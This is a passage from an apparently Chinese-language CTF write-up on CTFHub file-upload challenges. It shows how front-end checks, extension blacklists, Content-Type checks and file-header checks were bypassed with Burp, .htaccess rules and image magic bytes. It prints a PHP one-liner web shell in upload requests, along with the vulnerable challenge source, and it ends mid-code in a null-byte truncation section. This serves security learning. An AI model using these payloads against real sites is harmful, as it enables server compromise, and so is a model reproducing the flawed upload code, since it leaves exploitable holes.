class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return checkfilesuffix()&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>Filename:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkfilesuffix</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> file=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;file&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;value&#x27;</span>];</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(file==<span class="hljs-string">&quot;&quot;</span>||file==<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请添加上传文件&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">else</span></span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> whitelist=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;.jpg&quot;</span>,<span class="hljs-string">&quot;.png&quot;</span>,<span class="hljs-string">&quot;.gif&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> file_suffix=file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(whitelist.<span class="hljs-title function_">indexOf</span>(file_suffix) == -<span class="hljs-number">1</span>)</span><br><span class="language-javascript">        &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;该文件不允许上传&quot;</span>);</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>发现它在上传文件时调用了一个函数，这个函数只允许上传三种图片格式的文件。</p>
<p>这但是在前端验证，我们用burp抓包，先给它传一个<code>2.jpg</code>，先过前端验证，然后前端向后端请求的包会被burp抓到，这时候在请求包里包把文件名改成<code>2.php</code>就实现绕过前端验证并传马啦！</p>
<p>下面是原始请求包[节选]</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;2.jpg&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>image/jpeg<br><br>&lt;?php @eval($_POST[&#x27;wuuconix&#x27;]); ?&gt;<br>-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>Submit<br>-----------------------------27707769729801775931606292902--<br></code></pre></td></tr></table></figure>
<p>我们只要把文件名改成以下即可。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;2.php&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>image/jpeg<br><br>&lt;?php @eval($_POST[&#x27;wuuconix&#x27;]); ?&gt;<br>-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>Submit<br>-----------------------------27707769729801775931606292902--<br></code></pre></td></tr></table></figure>
<p>成功上传并连接。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901115943047.png" srcset="/img/loading.gif" lazyload alt="antsword连接" /></p>
<p>这也证明了一个事情，就是请求包里的<code>Content-Type</code>不改也行，只要后缀名是<code>php</code>，就能发挥它的职能，这个Content-Type应该只是传输过程中给服务器端的提示罢了，如果服务器端没有对该属性进行处理，那么它就是无效的。如果后台对这个Content-Type做了某种验证的话，我们就必须也得改了。</p>
<p>这是一种做法，既然验证代码在前端 ，可不可以直接把script标签删掉来绕过前端验证呢？</p>
<p>我试了一下，直接在源代码里把<code>script</code>标签删掉是掩耳盗铃，不能实现效果。但是如果利用Burp修改题目的Response，在相应里直接把<code>script</code>标签删掉就能够实现。</p>
<p>一般情况下Burp只是代理我们的请求，我还没有试过代理相应。</p>
<p>设置如下图。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901120721028.png" srcset="/img/loading.gif" lazyload alt="Burp代理相应" /></p>
<p>然后刷新一下页面，Forward一下，让自己的请求先发出去，然后你就会看到服务器的相应了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901120848381.png" srcset="/img/loading.gif" lazyload alt="Burp实现代理相应" /></p>
<p>在这个相应里把script标签删掉。</p>
<p>这时渲染出来的页面就是真真切切没有script标签的了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901120931080.png" srcset="/img/loading.gif" lazyload alt="源代码" /></p>
<p>能够直接上传php木马了。</p>
<h3 id="htaccess"><a class="markdownIt-Anchor" href="#htaccess"></a> .htaccess</h3>
<p>题目在注释中给出了后端php的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>)[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php7&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$blacklist</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>在后端把一些常见的木马后缀全部ban掉了，而且因为是后端验证，前端怎么改也没用。</p>
<p>这里就需要用到<code>.htaccess</code>，它是apcache中的配置文件。我们可以利用它实现把<code>.jpg</code>格式的文件拥有php脚本的能力。</p>
<p>一般有两种写法。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">&lt;FilesMatch &quot;.jpg&quot;&gt;<br>	SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
<p>所以只要先长传一个后缀在黑名单之外的<code>.htaccess</code>文件，让<code>.jpg</code>拥有也可以变为php脚本 ，再上传一个内部写有一句话木马的<code>1.jpg</code>，就能够挂马了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901124305770.png" srcset="/img/loading.gif" lazyload alt="antsword" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210901124349948.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<h3 id="mime绕过"><a class="markdownIt-Anchor" href="#mime绕过"></a> MIME绕过</h3>
<p>MIME是什么呢？上一篇<code>.htaccess</code>中出现的<code>application/x-httpd-php</code>其实就属于MIME的一种未被官方承认的类型。</p>
<p>MIME：<strong>M</strong>ultipurpose <strong>I</strong>nternet <strong>M</strong>ail <strong>E</strong>xtensions 中文专业名称为多用途互联网邮件扩展。</p>
<p>原来的邮件只支持7位ASCII字符集以内的字符，而MIME的提出则支持了其他的字符，甚至支持了图像、视频、音频等二进制文件。</p>
<p><img src="https://upyun.wuuconix.link/image-20210902102425660.png" srcset="/img/loading.gif" lazyload alt="Content-Type" /></p>
<p>我们在http请求报文中看到的<code>Content-Type</code>字段就是用来提供发送文件的MIME类型的。以下列出常用的MIME类型。</p>
<ul>
<li>text/plain（<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BA%AF%E6%96%87%E6%9C%AC">纯文本</a>）</li>
<li>text/html（HTML文档）</li>
<li>application/xhtml+xml（XHTML文档）</li>
<li>image/gif（GIF图像）</li>
<li>image/jpeg（JPEG图像）【PHP中为：image/pjpeg】</li>
<li>image/png（PNG图像）【PHP中为：image/x-png】</li>
<li>video/mpeg（MPEG动画）</li>
<li>application/octet-stream（任意的二进制数据）</li>
<li>application/pdf（PDF文档）</li>
<li>application/msword（Microsoft Word文件）</li>
<li>application/vnd.wap.xhtml+xml (wap1.0+)</li>
<li>application/xhtml+xml (wap2.0+)</li>
<li>message/rfc822（RFC 822形式）</li>
<li>multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</li>
<li>application/x-www-form-urlencoded（使用HTTP的POST方法提交的表单）</li>
<li>multipart/form-data（同上，但主要用于表单提交时伴随文件上传的场合）</li>
</ul>
<blockquote>
<p>此外，尚未被接受为正式数据类型的subtype，可以使用x-开始的独立名称（例如application/x-gzip）。vnd-开始的固有名称也可以使用（例：application/vnd.ms-excel）</p>
</blockquote>
<p>​	在这道题里就是对文件的Content-Type类型做了限制，而没有对后缀名做任何限制。题目php源代码如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>], [<span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>, <span class="hljs-string">&quot;image/jpg&quot;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件类型不正确&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>所以我们只需要传一个<code>1.php</code>，然后发送的时候用burp把Content-Type改成其中一个就行啦！</p>
<p><img src="https://upyun.wuuconix.link/image-20210902102752028.png" srcset="/img/loading.gif" lazyload alt="burp修改Content-Type成功上传" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210902102846823.png" srcset="/img/loading.gif" lazyload alt="antsword flag" /></p>
<h3 id="文件头检查"><a class="markdownIt-Anchor" href="#文件头检查"></a> 文件头检查</h3>
<p>听题目就可以看出来后台对文件的文件头做了检测。只支持图片。</p>
<p>我做题的姿势非常骚气。</p>
<p>首先利用python的<code>pillow</code>模块生成了一个1*1像素的png文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>), <span class="hljs-string">&quot;png&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&quot;red.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    img.save(f)<br></code></pre></td></tr></table></figure>
<p>然后上传，顺便用Burp拦截。</p>
<p>这是原始请求头。</p>
<p><img src="https://upyun.wuuconix.link/image-20210902123521878.png" srcset="/img/loading.gif" lazyload alt="原始请求头" /></p>
<p>图中乱码的部分应该就是二进制图片的内容。这时我们我们先把文件名改成<code>red.php</code>，再在图片二进制内容的后面加上一句话木马。</p>
<p><img src="https://upyun.wuuconix.link/image-20210902123805567.png" srcset="/img/loading.gif" lazyload alt="修改后" /></p>
<p>然后就能直接蚁剑连接了。顺便把它的源码偷过来以后用2333。</p>
<p><img src="https://upyun.wuuconix.link/image-20210902123934400.png" srcset="/img/loading.gif" lazyload alt="antsword" /></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;请添加上传文件&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;rb&quot;</span>);<br>        <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>], [<span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/jpg&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$bin</span>), [<span class="hljs-string">&quot;89504E47&quot;</span>, <span class="hljs-string">&quot;FFD8FFE0&quot;</span>, <span class="hljs-string">&quot;47494638&quot;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件错误&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;CTFHub 文件上传 - 文件头检测&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;CTFHub 文件上传 - 文件头检测&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>        &lt;br /&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>    &lt;/form&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<h3 id="00截断"><a class="markdownIt-Anchor" href="#00截断"></a> 00截断</h3>
<p>00截断真的十分玄学。</p>
<p>首先我们来看一下这道题的源码。注：服务器的php版本为5.2.17, magic_quotes_gpc为off状态。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span 